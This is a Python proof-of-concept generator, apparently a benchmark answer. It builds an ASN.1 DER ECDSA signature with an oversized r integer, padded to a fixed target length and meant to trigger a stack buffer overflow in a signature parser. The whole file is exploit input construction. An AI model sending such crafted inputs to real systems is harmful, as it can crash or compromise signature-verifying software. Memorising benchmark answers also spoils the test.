import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create an ECDSA signature in ASN.1 DER format that triggers stack buffer overflow
        # The vulnerability is in ASN.1 parsing of ECDSA signatures
        # We'll create a malformed signature with excessive length to overflow stack buffer
        
        # ASN.1 structure for ECDSA signature: SEQUENCE { INTEGER r, INTEGER s }
        # We'll create an extremely long r value to overflow the buffer
        
        # Ground truth length is 41798 bytes, so we aim for that exact length
        target_length = 41798
        
        # Create a minimal valid ASN.1 structure first
        # SEQUENCE tag
        sequence_tag = b'\x30'
        
        # We need to calculate the total length
        # The r integer will be very long (target_length - overhead)
        
        # Calculate overhead:
        # SEQUENCE tag: 1 byte
        # SEQUENCE length bytes: 2-4 bytes (we'll use 3 bytes for >65535)
        # INTEGER r tag: 1 byte
        # INTEGER r length bytes: 3-4 bytes (for large length)
        # INTEGER s tag: 1 byte
        # INTEGER s length: 1 byte (for 1 byte value)
        # INTEGER s value: 1 byte
        
        # Let's use 3 bytes for SEQUENCE length (covers up to 16777215)
        # and 3 bytes for INTEGER r length
        
        overhead = 1 + 3 + 1 + 3 + 1 + 1 + 1  # = 11 bytes
        r_value_length = target_length - overhead
        
        if r_value_length <= 0:
            # Fallback in case calculation is wrong
            r_value_length = target_length - 20
        
        # Create the r integer with excessive length
        # INTEGER tag
        r_tag = b'\x02'
        
        # r length in long form (3 bytes: 0x82 + 2-byte length)
        r_length_bytes = struct.pack('>H', r_value_length)
        r_length = b'\x82' + r_length_bytes
        
        # r value - all zeros to avoid creating a negative number
        r_value = b'\x00' * r_value_length
        
        # Create the s integer (normal, small)
        # INTEGER tag
        s_tag = b'\x02'
        # s length (1 byte)
        s_length = b'\x01'
        # s value (1 byte, non-zero to be valid)
        s_value = b'\x01'
        
        # Combine r and s
        r_part = r_tag + r_length + r_value
        s_part = s_tag + s_length + s_value
        
        # Calculate sequence content length
        seq_content = r_part + s_part
        seq_content_len = len(seq_content)
        
        # SEQUENCE length in long form (3 bytes for >65535)
        seq_length_bytes = struct.pack('>H', seq_content_len)
        seq_length = b'\x82' + seq_length_bytes
        
        # Build final ASN.1 structure
        poc = sequence_tag + seq_length + seq_content
        
        # Verify length matches target
        if len(poc) != target_length:
            # Adjust by padding or trimming
            diff = target_length - len(poc)
            if diff > 0:
                # Need to add more bytes - extend r_value
                r_value = b'\x00' * (r_value_length + diff)
                r_length_bytes = struct.pack('>H', r_value_length + diff)
                r_length = b'\x82' + r_length_bytes
                r_part = r_tag + r_length + r_value
                seq_content = r_part + s_part
                seq_content_len = len(seq_content)
                seq_length_bytes = struct.pack('>H', seq_content_len)
                seq_length = b'\x82' + seq_length_bytes
                poc = sequence_tag + seq_length + seq_content
            elif diff < 0:
                # Need to trim - reduce r_value
                r_value = b'\x00' * (r_value_length + diff)  # diff is negative
                r_length_bytes = struct.pack('>H', r_value_length + diff)
                r_length = b'\x82' + r_length_bytes
                r_part = r_tag + r_length + r_value
                seq_content = r_part + s_part
                seq_content_len = len(seq_content)
                seq_length_bytes = struct.pack('>H', seq_content_len)
                seq_length = b'\x82' + seq_length_bytes
                poc = sequence_tag + seq_length + seq_content
        
        return poc
